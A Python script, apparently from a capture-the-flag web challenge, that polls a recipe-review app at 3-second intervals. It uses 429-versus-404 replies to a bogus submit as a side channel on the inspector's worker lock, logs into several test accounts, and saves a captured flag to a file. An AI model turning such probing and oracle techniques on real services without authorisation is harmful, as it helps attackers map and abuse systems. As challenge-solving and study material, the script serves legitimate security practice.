#!/usr/bin/env python3
"""Poll the jammed batches fast enough to see a revisit, and use the 429 lock as a heartbeat.

Every "nothing ever happens" conclusion so far came from a 90-120 s poll. The worker holds a
batch in `reviewing` for only ~8 s, so a retry pass over an unsealed batch would be
completely invisible at that rate: it would leave the row exactly where it was
(`reviewed`, empty seal). This measures the two things a slow poll cannot see:

  * dashboard state transitions at 3 s resolution over the jammed batches, and
  * the global worker lock, probed with a submit against a nonexistent id. `no such recipe`
    (404) means the inspector is idle, `slow down -- inspector is busy` (429) means it is
    mid-batch. That is a per-probe view of worker activity that does not depend on my own
    rows changing.

If the inspector really does sweep unsealed batches, the heartbeat should show episodes that
correlate with our rows being touched - and then the interesting question becomes whether
the sweep ever escalates after N failures.
"""
import re
import sys
import time
from collections import Counter

from cc import Client, new_baker

BOGUS = "a" * 24
MINUTES = float(sys.argv[1]) if len(sys.argv) > 1 else 15.0
GAP = 3.0

USERS = ["pl5392", "sz3576", "of1726"]


def log(*a):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), " ".join(str(x) for x in a))
    sys.stdout.buffer.write((line + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def rows(c):
    code, dash, dt = c.get("/dashboard")
    if code != 200:
        return None
    out = {}
    for b in re.finditer(r"<tr>(.*?)</tr>", dash, re.S):
        bb = b.group(0)
        rid = re.search(r"/recipe/([0-9a-f]{24})", bb)
        if not rid:
            continue
        st = re.search(r'class="pill (\w+)">(\w+)</span>', bb)
        tail = " ".join(re.sub(r"<[^>]+>", " ", bb.split("</span>")[-1]).split())
        out[rid.group(1)] = (st.group(2) if st else "?",
                             "NONE" if "&mdash;" in tail else ("standard" if "standard" in tail else tail[:22]))
    return out


sess = []
for u in USERS:
    c = Client()
    code, out, dt = c.post("/login", {"username": u, "password": "Passw0rd!"})
    if code == 200:
        sess.append((u, c))
    else:
        log("login %s -> %s" % (u, code))
probe = Client()
probe.post("/login", {"username": new_baker("hp")[0], "password": "Passw0rd!"})

log("=== does the 429 lock answer before the 404 lookup? ===")
rid = None
u0, c0 = sess[0]
code, out, dt = c0.post("/api/recipe", {"title": "heartbeat bait",
                                       "ingredients": [{"name": "flour", "value": "1"}]})
rid = out["id"]
code, out, dt = c0.post("/api/recipe/%s/submit" % rid, {})
log("submitted bait %s -> %s; now probing a bogus id while the worker should be busy" % (rid[:8], code))
for i in range(10):
    sc, so, sdt = probe.post("/api/recipe/%s/submit" % BOGUS, {})
    log("   bogus submit #%d -> %s %s" % (i, sc, str(so)[:50]))
    time.sleep(1.2)

log("=== 3 s resolution watch, %.0f min ===" % MINUTES)
t0 = time.time()
seen = {}
codes = Counter()
while time.time() - t0 < MINUTES * 60:
    for u, c in sess:
        st = rows(c)
        if st is None:
            c.post("/login", {"username": u, "password": "Passw0rd!"})
            continue
        for rid, sig in st.items():
            if seen.get(rid) != sig:
                log("  t+%4ds %-8s %s %s %s" % (int(time.time() - t0), u, rid[:8], sig[0], sig[1]))
                seen[rid] = sig
            if sig[1] not in ("NONE", "standard"):
                code, page, _ = c.get("/recipe/%s" % rid)
                gold = re.search(r'class="seal gold"[\s\S]{0,600}?class="flag"[^>]*>\s*([^<]+)', str(page))
                log("  !!! %s %s -> %s gold=%s" % (u, rid[:8], sig, gold and gold.group(1)))
                if gold:
                    open("../flag.txt", "w", encoding="utf-8").write(gold.group(1).strip() + "\n")
                    sys.exit(0)
    sc, so, sdt = probe.post("/api/recipe/%s/submit" % BOGUS, {})
    codes[sc] += 1
    time.sleep(GAP)
log("lock probe result: %s" % dict(codes))
log("no state change beyond the lines above")
